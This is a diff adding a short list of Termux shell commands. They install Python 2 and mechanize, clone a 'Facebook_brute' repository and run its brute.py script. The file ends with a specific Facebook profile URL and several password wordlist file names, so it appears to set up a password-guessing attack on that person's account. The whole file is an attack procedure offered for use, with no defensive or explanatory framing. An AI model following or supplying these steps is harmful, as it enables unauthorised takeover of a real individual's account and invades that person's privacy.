@@ -1,0 +1,33 @@
+apt update && apt upgrade -y
+termux-setup-storage
+pkg install git openssh php python python2 -y; pip2 install mechanize; pip install --upgrade pip
+git clone https://github.com/perjayro/Facebook_brute.git
+apt update && apt upgrade -y
+
+termux-setup-storage
+
+apt install -y python
+
+apt install -y python2
+
+apt install -y python2-dev
+
+apt install pip2
+
+pip2 install mechanize
+
+apt  install -y git
+git clone https://github.com/perjayro/Facebook_brute.git
+
+cd Facebook_brute
+
+chmod +x brute.py
+
+python2 brute.py
+
+https://www.facebook.com/lizethd96
+
+Pass.txt
+pass1.txt
+pass2.txt
+pass3.txt
